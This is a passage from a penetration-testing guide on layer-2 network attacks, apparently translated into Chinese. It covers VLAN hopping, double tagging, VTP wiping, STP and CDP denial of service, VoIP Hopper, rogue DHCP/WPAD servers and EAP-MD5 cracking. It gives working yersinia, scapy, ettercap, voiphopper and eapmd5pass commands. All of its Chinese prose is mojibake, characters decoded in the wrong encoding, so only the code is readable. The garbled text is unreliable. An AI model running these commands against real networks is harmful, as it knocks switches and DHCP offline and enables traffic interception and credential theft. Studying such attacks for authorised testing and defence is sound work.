ä¸€æ—¦æ‚¨çŸ¥é“VLAN IDå’ŒIPå€¼ï¼Œæ‚¨å¯ä»¥**é…ç½®è™šæ‹Ÿæ¥å£ä»¥æ”»å‡»ç‰¹å®šVLAN**ã€‚\
å¦‚æœDHCPä¸å¯ç”¨ï¼Œåˆ™ä½¿ç”¨_ifconfig_è®¾ç½®é™æ€IPåœ°å€ã€‚
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### è‡ªåŠ¨ VLAN è·³è·ƒå™¨

è®¨è®ºçš„æ”»å‡»**åŠ¨æ€å¹²çº¿å’Œåˆ›å»ºè™šæ‹Ÿæ¥å£ä»¥åŠå‘ç°å…¶ä»– VLAN ä¸­çš„ä¸»æœº**æ˜¯ç”±å·¥å…·è‡ªåŠ¨æ‰§è¡Œçš„ï¼š[**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### åŒé‡æ ‡è®°

å¦‚æœæ”»å‡»è€…çŸ¥é“å—å®³ä¸»æœºçš„**MACã€IP å’Œ VLAN ID çš„å€¼**ï¼Œä»–å¯ä»¥å°è¯•ç”¨æŒ‡å®šçš„ VLAN å’Œå—å®³è€…çš„ VLAN **åŒé‡æ ‡è®°ä¸€ä¸ªå¸§**ï¼Œç„¶åå‘é€ä¸€ä¸ªæ•°æ®åŒ…ã€‚ç”±äº**å—å®³è€…æ— æ³•ä¸æ”»å‡»è€…è¿æ¥å›æ¥**ï¼Œæ‰€ä»¥**æ”»å‡»è€…çš„æœ€ä½³é€‰æ‹©æ˜¯é€šè¿‡ UDP é€šä¿¡**åˆ°å¯ä»¥æ‰§è¡Œä¸€äº›æœ‰è¶£æ“ä½œçš„åè®®ï¼ˆå¦‚ SNMPï¼‰ã€‚

æ”»å‡»è€…çš„å¦ä¸€ä¸ªé€‰æ‹©æ˜¯å‘èµ·**TCP ç«¯å£æ‰«æï¼Œæ¬ºéª—å—å®³è€…å¯è®¿é—®çš„ç”±æ”»å‡»è€…æ§åˆ¶çš„ IP**ï¼ˆå¯èƒ½é€šè¿‡äº’è”ç½‘ï¼‰ã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥å—…æ¢ä»–æ‹¥æœ‰çš„ç¬¬äºŒä¸ªä¸»æœºï¼Œçœ‹çœ‹å®ƒæ˜¯å¦æ”¶åˆ°æ¥è‡ªå—å®³è€…çš„ä¸€äº›æ•°æ®åŒ…ã€‚

![](<../../.gitbook/assets/image (635) (1).png>)

è¦æ‰§è¡Œæ­¤æ”»å‡»ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ scapyï¼š`pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### ä¾§å‘ VLAN åˆ†å‰²ç»•è¿‡ <a href="#d679" id="d679"></a>

å¦‚æœæ‚¨å¯ä»¥**è®¿é—®ç›´æ¥è¿æ¥çš„äº¤æ¢æœº**ï¼Œåˆ™å¯ä»¥åœ¨ç½‘ç»œä¸­**ç»•è¿‡ VLAN åˆ†å‰²**ã€‚åªéœ€å°†ç«¯å£åˆ‡æ¢åˆ°å¹²çº¿æ¨¡å¼ï¼ˆä¹Ÿç§°ä¸ºå¹²çº¿ï¼‰ï¼Œä½¿ç”¨ç›®æ ‡ VLAN çš„ ID åˆ›å»ºè™šæ‹Ÿæ¥å£ï¼Œå¹¶é…ç½® IP åœ°å€ã€‚æ‚¨å¯ä»¥å°è¯•åŠ¨æ€è¯·æ±‚åœ°å€ï¼ˆDHCPï¼‰ï¼Œä¹Ÿå¯ä»¥é™æ€é…ç½®ã€‚è¿™å–å†³äºå…·ä½“æƒ…å†µã€‚

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### ç¬¬ 3 å±‚ç§æœ‰ VLAN ç»•è¿‡

åœ¨å®¢ç”¨æ— çº¿ç½‘ç»œå’Œå…¶ä»–ç¯å¢ƒä¸­ï¼Œç§æœ‰ VLANï¼ˆä¹Ÿç§°ä¸º _ç«¯å£éš”ç¦»_ï¼‰è®¾ç½®ç”¨äº**é˜²æ­¢å¯¹ç­‰æ–¹äº’åŠ¨**ï¼ˆå³ï¼Œå®¢æˆ·ç«¯**è¿æ¥åˆ°æ— çº¿æ¥å…¥ç‚¹ä½†æ— æ³•ç›¸äº’é€šä¿¡**ï¼‰ã€‚æ ¹æ®ç½‘ç»œ ACLï¼ˆæˆ–ç¼ºä¹ ACLï¼‰ï¼Œå¯èƒ½ä¼šå°† IP æ•°æ®åŒ…å‘é€åˆ°è·¯ç”±å™¨ï¼Œç„¶åå†è½¬å‘ç»™ç›¸é‚»å¯¹ç­‰æ–¹ã€‚

æ­¤æ”»å‡»å°†å‘å®¢æˆ·ç«¯çš„ IP å‘é€**ç»è¿‡ç‰¹æ®Šæ„é€ çš„æ•°æ®åŒ…ï¼Œä½†ä½¿ç”¨è·¯ç”±å™¨çš„ MAC åœ°å€**ã€‚ç„¶åï¼Œ**è·¯ç”±å™¨å°†å°†æ•°æ®åŒ…é‡å®šå‘åˆ°å®¢æˆ·ç«¯**ã€‚ä¸ _åŒæ ‡è®°æ”»å‡»_ ä¸€æ ·ï¼Œæ‚¨å¯ä»¥é€šè¿‡æ§åˆ¶å—å®³è€…å¯è®¿é—®çš„ä¸»æœºæ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚

### VTP æ”»å‡»

**VTPï¼ˆVLAN å¹²çº¿åè®®ï¼‰**æ˜¯ä¸€ç§æ—¨åœ¨é›†ä¸­ç®¡ç† VLAN çš„åè®®ã€‚ä¸ºäº†è·Ÿè¸ªå½“å‰çš„ VLAN æ•°æ®åº“ï¼Œäº¤æ¢æœºä¼šæ£€æŸ¥ç‰¹æ®Šçš„ä¿®è®¢å·ã€‚å½“å‘ç”Ÿä»»ä½•è¡¨æ›´æ–°æ—¶ï¼Œä¿®è®¢å·ä¼šé€’å¢ä¸€æ¬¡ã€‚å¦‚æœäº¤æ¢æœºæ£€æµ‹åˆ°å…·æœ‰æ›´é«˜ä¿®è®¢å·çš„é…ç½®ï¼Œåˆ™å®ƒå°†è‡ªåŠ¨æ›´æ–°å…¶ VLAN æ•°æ®åº“ã€‚

#### VTP åŸŸä¸­çš„è§’è‰² <a href="#ebfc" id="ebfc"></a>

* **VTP æœåŠ¡å™¨ã€‚** å¤„äº VTP æœåŠ¡å™¨è§’è‰²çš„äº¤æ¢æœºå¯ä»¥åˆ›å»ºæ–°çš„ VLANã€åˆ é™¤æ—§çš„ VLANï¼Œæˆ–æ›´æ”¹ VLAN æœ¬èº«çš„ä¿¡æ¯ã€‚**å®ƒè¿˜ä¼šä¸ºåŸŸä¸­çš„å…¶ä»–æˆå‘˜ç”Ÿæˆ VTP å…¬å‘Šã€‚**
* **VTP å®¢æˆ·ç«¯ã€‚** å¤„äºæ­¤è§’è‰²çš„äº¤æ¢æœºå°†ä»åŸŸä¸­çš„å…¶ä»–äº¤æ¢æœºæ¥æ”¶ç‰¹å®šçš„ VTP å…¬å‘Šï¼Œä»¥æ›´æ–°å…¶è‡ªå·±çš„ VLAN æ•°æ®åº“ã€‚å®¢æˆ·ç«¯åœ¨åˆ›å»º VLAN æ–¹é¢å—åˆ°é™åˆ¶ï¼Œç”šè‡³ä¸å…è®¸åœ¨æœ¬åœ°æ›´æ”¹ VLAN é…ç½®ã€‚æ¢å¥è¯è¯´ï¼Œ**åªè¯»è®¿é—®ã€‚**
* **VTP é€æ˜æ¨¡å¼ã€‚** åœ¨æ­¤æ¨¡å¼ä¸‹ï¼Œäº¤æ¢æœºä¸å‚ä¸ VTP è¿‡ç¨‹ï¼Œå¹¶å¯ä»¥å®Œå…¨å’Œæœ¬åœ°åœ°ç®¡ç†æ•´ä¸ª VLAN é…ç½®ã€‚åœ¨é€æ˜æ¨¡å¼ä¸‹è¿è¡Œæ—¶ï¼Œäº¤æ¢æœºä»…ä¼ è¾“æ¥è‡ªå…¶ä»–äº¤æ¢æœºçš„ VTP å…¬å‘Šï¼Œè€Œä¸ä¼šå½±å“å…¶ VLAN é…ç½®ã€‚**è¿™äº›äº¤æ¢æœºçš„ä¿®è®¢å·å§‹ç»ˆä¸ºé›¶ï¼Œæ— æ³•å—åˆ°æ”»å‡»ã€‚**

#### å¹¿å‘Šç±»å‹ <a href="#b384" id="b384"></a>

* **æ‘˜è¦å¹¿å‘Š â€”** VTP æœåŠ¡å™¨æ¯**300 ç§’ï¼ˆ5 åˆ†é’Ÿï¼‰**å‘é€çš„ VTP å…¬å‘Šã€‚æ­¤å…¬å‘Šå­˜å‚¨ VTP åŸŸåã€åè®®ç‰ˆæœ¬ã€æ—¶é—´æˆ³å’Œ MD5 é…ç½®å“ˆå¸Œå€¼ã€‚
* **å­é›†å¹¿å‘Š â€”** æ¯å½“ VLAN é…ç½®æ›´æ”¹æ—¶å‘é€çš„ VTP å…¬å‘Šã€‚
* **å¹¿å‘Šè¯·æ±‚ â€”** æ˜¯ VTP å®¢æˆ·ç«¯å‘ VTP æœåŠ¡å™¨è¯·æ±‚æ‘˜è¦å¹¿å‘Šæ¶ˆæ¯ã€‚é€šå¸¸ä½œä¸ºå“åº”æ¶ˆæ¯å‘é€ï¼Œä»¥æŒ‡ç¤ºäº¤æ¢æœºæ£€æµ‹åˆ°å…·æœ‰æ›´é«˜é…ç½®ä¿®è®¢å·çš„æ‘˜è¦å¹¿å‘Šã€‚

VTP åªèƒ½ä»å¹²çº¿ç«¯å£**å—åˆ°æ”»å‡»ï¼Œå› ä¸º VTP å…¬å‘Šä»…åœ¨å¹²çº¿ç«¯å£ä¸Šå¹¿æ’­å’Œæ¥æ”¶ã€‚**å› æ­¤ï¼Œåœ¨æ”»å‡» DTP åè¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œæ‚¨çš„ä¸‹ä¸€ä¸ªç›®æ ‡å¯èƒ½æ˜¯ VTPã€‚**è¦æ”»å‡» VTP åŸŸï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ Yersinia è¿è¡Œ VTP æ³¨å…¥ï¼Œå°†**æ“¦é™¤æ•´ä¸ª VLAN æ•°æ®åº“**ï¼Œä»è€Œä½¿ç½‘ç»œç˜«ç—ªã€‚

{% hint style="info" %}
VTP åè®®æœ‰**ä¸‰ä¸ªç‰ˆæœ¬**ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæ”»å‡»é’ˆå¯¹ç¬¬ä¸€ä¸ªç‰ˆæœ¬ VTPv1ã€‚
{% endhint %}
```bash
yersinia -G #For graphic mode
```
è¦åˆ é™¤æ•´ä¸ªVLANæ•°æ®åº“ï¼Œè¯·é€‰æ‹©**åˆ é™¤æ‰€æœ‰VTP VLAN**é€‰é¡¹

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### STPæ”»å‡»

**å¦‚æœæ‚¨æ— æ³•åœ¨æ¥å£ä¸Šæ•è·BPDUå¸§ï¼Œåˆ™å¾ˆéš¾æˆåŠŸè¿›è¡ŒSTPæ”»å‡»ã€‚**

#### **STP BPDU DoS**

å‘é€å¤§é‡çš„BPDUs TCPï¼ˆæ‹“æ‰‘æ›´æ”¹é€šçŸ¥ï¼‰æˆ–Confï¼ˆåœ¨åˆ›å»ºæ‹“æ‰‘æ—¶å‘é€çš„BPDUsï¼‰ï¼Œäº¤æ¢æœºä¼šè¿‡è½½å¹¶åœæ­¢æ­£å¸¸å·¥ä½œã€‚
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP æ”»å‡»**

å½“å‘é€ TCP æ—¶ï¼Œäº¤æ¢æœºçš„ CAM è¡¨å°†åœ¨ 15 ç§’å†…è¢«åˆ é™¤ã€‚ç„¶åï¼Œå¦‚æœæŒç»­å‘é€è¿™ç§ç±»å‹çš„æ•°æ®åŒ…ï¼ŒCAM è¡¨å°†ä¸æ–­é‡æ–°å¯åŠ¨ï¼ˆæˆ–æ¯ 15 ç§’ï¼‰å¹¶åœ¨é‡æ–°å¯åŠ¨æ—¶ï¼Œäº¤æ¢æœºå°†è¡¨ç°ä¸ºé›†çº¿å™¨ã€‚
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

æ”»å‡»è€…æ¨¡æ‹Ÿäº¤æ¢æœºçš„è¡Œä¸ºï¼Œæˆä¸ºç½‘ç»œçš„STPæ ¹ã€‚ç„¶åï¼Œæ›´å¤šæ•°æ®å°†é€šè¿‡ä»–ä¼ é€’ã€‚å½“æ‚¨è¿æ¥åˆ°ä¸¤ä¸ªä¸åŒçš„äº¤æ¢æœºæ—¶ï¼Œè¿™æ˜¯å¾ˆæœ‰è¶£çš„ã€‚\
è¿™æ˜¯é€šè¿‡å‘é€BPDUs CONFæ•°æ®åŒ…æ¥å®ç°çš„ï¼Œå…¶ä¸­æŒ‡å®š**ä¼˜å…ˆçº§**å€¼å°äºå®é™…æ ¹äº¤æ¢æœºçš„ä¼˜å…ˆçº§ã€‚
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**å¦‚æœæ”»å‡»è€…è¿æ¥åˆ°2ä¸ªäº¤æ¢æœºï¼Œä»–å¯ä»¥æˆä¸ºæ–°æ ‘çš„æ ¹ï¼Œè¿™ä¸¤ä¸ªäº¤æ¢æœºä¹‹é—´çš„æ‰€æœ‰æµé‡éƒ½å°†é€šè¿‡ä»–ä¼ é€’**ï¼ˆå°†æ‰§è¡Œä¸­é—´äººæ”»å‡»ï¼‰ã€‚
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP æ”»å‡»

**æ€ç§‘å‘ç°åè®®ï¼ˆCDPï¼‰** æ˜¯æ€ç§‘è®¾å¤‡ç”¨æ¥ç›¸äº’é€šä¿¡ã€**å‘ç°å­˜æ´»è®¾å¤‡**ä»¥åŠå®ƒä»¬çš„åŠŸèƒ½çš„åè®®ã€‚

#### ä¿¡æ¯æ”¶é›† <a href="#0e0f" id="0e0f"></a>

**é»˜è®¤æƒ…å†µä¸‹ï¼ŒCDPä¼šå‘æ‰€æœ‰ç«¯å£å‘é€é€šå‘Šã€‚** ä½†æ˜¯å¦‚æœå…¥ä¾µè€…è¿æ¥åˆ°åŒä¸€äº¤æ¢æœºä¸Šçš„ä¸€ä¸ªç«¯å£ä¼šæ€æ ·å‘¢ï¼Ÿä½¿ç”¨ç½‘ç»œå—…æ¢å·¥å…·ï¼Œå¦‚**Wireshark**ã€**tcpdump**æˆ–**Yersinia**ï¼Œä»–å¯ä»¥æå–**æœ‰å…³è®¾å¤‡æœ¬èº«çš„å®è´µä¿¡æ¯**ï¼Œä»å…¶å‹å·åˆ°æ€ç§‘IOSç‰ˆæœ¬ã€‚åˆ©ç”¨è¿™äº›ä¿¡æ¯ï¼Œä»–å°†èƒ½å¤Ÿæšä¸¾ç›¸åŒç‰ˆæœ¬çš„æ€ç§‘IOSå¹¶æ‰¾åˆ°æ¼æ´ï¼Œç„¶ååˆ©ç”¨å®ƒã€‚

#### CDP æ´ªæ³›æ”»å‡» <a href="#0d6a" id="0d6a"></a>

æ‚¨å¯ä»¥é€šè¿‡è€—å°½è®¾å¤‡å†…å­˜æ¨¡æ‹ŸçœŸå®çš„æ€ç§‘è®¾å¤‡ï¼Œå¯¹æ€ç§‘äº¤æ¢æœºå‘èµ·æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
é€‰æ‹©**æ³›æ´ªCDPè¡¨**é€‰é¡¹å¹¶å¼€å§‹æ”»å‡»ã€‚äº¤æ¢æœºçš„CPUå°†è¢«è¶…è½½ï¼Œä»¥åŠCDPé‚»å±…è¡¨ï¼Œ**å¯¼è‡´â€œç½‘ç»œç˜«ç—ªâ€ã€‚**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### CDPå†’å……æ”»å‡»
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨[**scapy**](https://github.com/secdev/scapy/)ã€‚è¯·ç¡®ä¿ä½¿ç”¨`scapy/contrib`è½¯ä»¶åŒ…è¿›è¡Œå®‰è£…ã€‚

### VoIP æ”»å‡»

å°½ç®¡æ—¨åœ¨ä¾›å‘˜å·¥ä½¿ç”¨çš„äº’è”ç½‘ç”µè¯ï¼ˆVoIPï¼‰ç”µè¯ï¼Œä½†ç°ä»£VoIPè®¾å¤‡è¶Šæ¥è¶Šå¤šåœ°ä¸ç‰©è”ç½‘è®¾å¤‡é›†æˆã€‚è®¸å¤šå‘˜å·¥ç°åœ¨å¯ä»¥ä½¿ç”¨ç‰¹æ®Šç”µè¯å·ç è§£é”é—¨ï¼Œæ§åˆ¶æˆ¿é—´çš„æ’æ¸©å™¨...

è¯¥å·¥å…·[**voiphopper**](http://voiphopper.sourceforge.net)æ¨¡æ‹Ÿäº†æ€ç§‘ã€Avayaã€Nortel å’Œ Alcatel-Lucent ç¯å¢ƒä¸­ VoIP ç”µè¯çš„è¡Œä¸ºã€‚å®ƒä½¿ç”¨å…¶æ”¯æŒçš„è®¾å¤‡å‘ç°åè®®ä¹‹ä¸€ï¼ˆå¦‚æ€ç§‘å‘ç°åè®®ï¼ˆCDPï¼‰ã€åŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼ˆDHCPï¼‰ã€é“¾è·¯å±‚å‘ç°åè®®åª’ä½“ç«¯ç‚¹å‘ç°ï¼ˆLLDP-MEDï¼‰å’Œ 802.1Q ARPï¼‰è‡ªåŠ¨å‘ç°è¯­éŸ³ç½‘ç»œçš„æ­£ç¡® VLAN IDã€‚

**VoIP Hopper** æ”¯æŒ**ä¸‰ç§** CDP æ¨¡å¼ã€‚**sniff** æ¨¡å¼æ£€æŸ¥ç½‘ç»œæ•°æ®åŒ…å¹¶å°è¯•å®šä½ VLAN IDã€‚è¦ä½¿ç”¨å®ƒï¼Œè¯·å°†**`-c`**å‚æ•°è®¾ç½®ä¸º`0`ã€‚**spoof** æ¨¡å¼ç”Ÿæˆç±»ä¼¼äºçœŸå® VoIP è®¾å¤‡åœ¨ä¼ä¸šç½‘ç»œä¸­ä¼ è¾“çš„è‡ªå®šä¹‰æ•°æ®åŒ…ã€‚è¦ä½¿ç”¨å®ƒï¼Œè¯·å°†**`-c`**å‚æ•°è®¾ç½®ä¸º**`1`**ã€‚å¸¦æœ‰**pre-madepacket**çš„æ¬ºéª—æ¨¡å¼å‘é€ä¸ Cisco 7971G-GE IP ç”µè¯ç›¸åŒçš„æ•°æ®åŒ…ã€‚è¦ä½¿ç”¨å®ƒï¼Œè¯·å°†**`-c`**å‚æ•°è®¾ç½®ä¸º**`2`**ã€‚

æˆ‘ä»¬ä½¿ç”¨æœ€åä¸€ç§æ–¹æ³•ï¼Œå› ä¸ºå®ƒæ˜¯æœ€å¿«çš„æ–¹æ³•ã€‚**`-i`**å‚æ•°æŒ‡å®šæ”»å‡»è€…çš„**ç½‘ç»œ** **æ¥å£**ï¼Œ**`-E`**å‚æ•°æŒ‡å®šè¦æ¨¡ä»¿çš„**VOIP è®¾å¤‡çš„åç§°**ã€‚æˆ‘ä»¬é€‰æ‹©äº†åç§° SEP001EEEEEEEEEï¼Œè¿™ä¸æ€ç§‘VoIPç”µè¯çš„å‘½åæ ¼å¼å…¼å®¹ã€‚è¯¥æ ¼å¼ç”±â€œSEPâ€ä¸€è¯åè·Ÿ MAC åœ°å€ç»„æˆã€‚åœ¨ä¼ä¸šç¯å¢ƒä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡æŸ¥çœ‹ç”µè¯èƒŒé¢çš„ MAC æ ‡ç­¾ï¼›æŒ‰ä¸‹è®¾ç½®æŒ‰é’®å¹¶åœ¨ç”µè¯æ˜¾ç¤ºå±ä¸Šé€‰æ‹©æ¨¡å‹ä¿¡æ¯é€‰é¡¹ï¼›æˆ–å°† VoIP è®¾å¤‡çš„ä»¥å¤ªç½‘ç”µç¼†è¿æ¥åˆ°æ‚¨çš„ç¬”è®°æœ¬ç”µè„‘ï¼Œå¹¶ä½¿ç”¨ Wireshark è§‚å¯Ÿè®¾å¤‡çš„ CDP è¯·æ±‚æ¥æ¨¡ä»¿ç°æœ‰çš„ VoIP è®¾å¤‡ã€‚
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
å¦‚æœå·¥å…·æˆåŠŸæ‰§è¡Œï¼Œ**VLANç½‘ç»œå°†ä¸ºæ”»å‡»è€…çš„è®¾å¤‡åˆ†é…ä¸€ä¸ªIPv4åœ°å€**ã€‚

### DHCPæ”»å‡»

#### æšä¸¾
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

é’ˆå¯¹ DHCP æœåŠ¡å™¨å¯ä»¥æ‰§è¡Œä¸¤ç§ç±»å‹çš„ DoS æ”»å‡»ã€‚ç¬¬ä¸€ç§ç±»å‹æ˜¯**æ¨¡æ‹Ÿè¶³å¤Ÿå¤šçš„è™šå‡ä¸»æœºä»¥ä½¿ç”¨æ‰€æœ‰å¯èƒ½çš„ IP åœ°å€**ã€‚\
åªæœ‰åœ¨æ‚¨èƒ½å¤Ÿçœ‹åˆ° DHCP æœåŠ¡å™¨çš„å“åº”å¹¶å®Œæˆåè®®ï¼ˆ**Discover**ï¼ˆè®¡ç®—æœºï¼‰--> **Offer**ï¼ˆæœåŠ¡å™¨ï¼‰--> **Request**ï¼ˆè®¡ç®—æœºï¼‰--> **ACK**ï¼ˆæœåŠ¡å™¨ï¼‰ï¼‰æ—¶ï¼Œæ­¤æ”»å‡»æ‰ä¼šç”Ÿæ•ˆã€‚ä¾‹å¦‚ï¼Œè¿™åœ¨**Wifi ç½‘ç»œä¸­æ˜¯ä¸å¯èƒ½çš„**ã€‚

æ‰§è¡Œ DHCP DoS çš„å¦ä¸€ç§æ–¹æ³•æ˜¯å‘é€ä¸€ä¸ª**ä½¿ç”¨æ¯ä¸ªå¯èƒ½çš„ IP ä½œä¸ºæºä»£ç çš„ DHCP-RELEASE æ•°æ®åŒ…**ã€‚ç„¶åï¼ŒæœåŠ¡å™¨ä¼šè®¤ä¸ºæ¯ä¸ªäººéƒ½å·²ç»å®Œæˆäº†å¯¹è¯¥ IP çš„ä½¿ç”¨ã€‚
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
ä¸€ç§æ›´è‡ªåŠ¨åŒ–çš„æ–¹æ³•æ˜¯ä½¿ç”¨å·¥å…·[DHCPing](https://github.com/kamorin/DHCPig)

æ‚¨å¯ä»¥ä½¿ç”¨ä¸Šè¿°çš„DoSæ”»å‡»æ¥å¼ºåˆ¶å®¢æˆ·ç«¯åœ¨ç¯å¢ƒä¸­è·å–æ–°çš„ç§Ÿçº¦ï¼Œå¹¶è€—å°½åˆæ³•æœåŠ¡å™¨ï¼Œä½¿å…¶æ— æ³•å“åº”ã€‚å› æ­¤ï¼Œå½“åˆæ³•æœåŠ¡å™¨å°è¯•é‡æ–°è¿æ¥æ—¶ï¼Œ**æ‚¨å¯ä»¥æä¾›ä¸‹ä¸€ä¸ªæ”»å‡»ä¸­æåˆ°çš„æ¶æ„å€¼**ã€‚

#### è®¾ç½®æ¶æ„å€¼

æ‚¨å¯ä»¥ä½¿ç”¨Responder DHCPè„šæœ¬ï¼ˆ_/usr/share/responder/DHCP.py_ï¼‰æ¥å»ºç«‹ä¸€ä¸ªæ¶æ„çš„DHCPæœåŠ¡å™¨ã€‚è®¾ç½®æ¶æ„ç½‘å…³å¹¶ä¸ç†æƒ³ï¼Œå› ä¸ºåŠ«æŒçš„è¿æ¥æ˜¯åŠåŒå·¥çš„ï¼ˆå³ï¼Œæˆ‘ä»¬æ•è·å®¢æˆ·ç«¯çš„å‡ºç«™æ•°æ®åŒ…ï¼Œä½†æ— æ³•æ•è·åˆæ³•ç½‘å…³çš„å“åº”ï¼‰ã€‚å› æ­¤ï¼Œæˆ‘å»ºè®®è®¾ç½®ä¸€ä¸ªæ¶æ„çš„DNSæˆ–WPADæœåŠ¡å™¨æ¥æ•è·HTTPæµé‡å’Œå‡­æ®ã€‚

| æè¿°                                       | ç¤ºä¾‹                                                                      |
| ---------------------------------------- | ------------------------------------------------------------------------ |
| æˆ‘ä»¬ä½œä¸ºç½‘å…³å¹¿å‘Šçš„IPåœ°å€                         | _-i 10.0.0.100_                                                          |
| æœ¬åœ°DNSåŸŸåï¼ˆå¯é€‰ï¼‰                             | _-d example.org_                                                        |
| åŸå§‹è·¯ç”±å™¨/ç½‘å…³çš„IPåœ°å€                           | _-r 10.0.0.1_                                                           |
| ä¸»DNSæœåŠ¡å™¨IPåœ°å€                             | _-p 10.0.0.100_                                                         |
| æ¬¡è¦DNSæœåŠ¡å™¨IPåœ°å€ï¼ˆå¯é€‰ï¼‰                        | _-s 10.0.0.1_                                                           |
| æœ¬åœ°ç½‘ç»œçš„å­ç½‘æ©ç                               | _-n 255.255.255.0_                                                      |
| ç”¨äºç›‘å¬DHCPæµé‡çš„æ¥å£                            | _-I eth1_                                                              |
| WPADé…ç½®åœ°å€ï¼ˆURLï¼‰                           | _-w â€œ[http://10.0.0.100/wpad.dat\nâ€](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| ä¼ªé€ é»˜è®¤ç½‘å…³IPåœ°å€                             | -S                                                                     |
| å“åº”æ‰€æœ‰DHCPè¯·æ±‚ï¼ˆéå¸¸å˜ˆæ‚ï¼‰                        | -R                                                                     |

### **EAPæ”»å‡»**

ä»¥ä¸‹æ˜¯é’ˆå¯¹802.1Xå®ç°å¯ç”¨çš„ä¸€äº›æ”»å‡»ç­–ç•¥ï¼š

* é€šè¿‡EAPä¸»åŠ¨æš´åŠ›ç ´è§£å¯†ç 
* ä½¿ç”¨æ¶æ„çš„EAPå†…å®¹æ”»å‡»RADIUSæœåŠ¡å™¨ _\*\*_(exploits)
* æ•è·EAPæ¶ˆæ¯å¹¶ç¦»çº¿ç ´è§£å¯†ç ï¼ˆEAP-MD5å’ŒPEAPï¼‰
* å¼ºåˆ¶ä½¿ç”¨EAP-MD5èº«ä»½éªŒè¯ç»•è¿‡TLSè¯ä¹¦éªŒè¯
* åœ¨ä½¿ç”¨é›†çº¿å™¨æˆ–ç±»ä¼¼è®¾å¤‡è¿›è¡Œèº«ä»½éªŒè¯åæ³¨å…¥æ¶æ„ç½‘ç»œæµé‡

å¦‚æœæ”»å‡»è€…ä½äºå—å®³è€…å’Œè®¤è¯æœåŠ¡å™¨ä¹‹é—´ï¼Œä»–å¯ä»¥å°è¯•é™çº§ï¼ˆå¦‚æœå¿…è¦ï¼‰è®¤è¯åè®®åˆ°EAP-MD5ï¼Œå¹¶æ•è·è®¤è¯å°è¯•ã€‚ç„¶åï¼Œä»–å¯ä»¥ä½¿ç”¨æš´åŠ›ç ´è§£ï¼š
```
eapmd5pass â€“r pcap.dump â€“w /usr/share/wordlist/sqlmap.txt
```
### FHRPï¼ˆGLBPå’ŒHSRPï¼‰æ”»å‡» <a href="#6196" id="6196"></a>

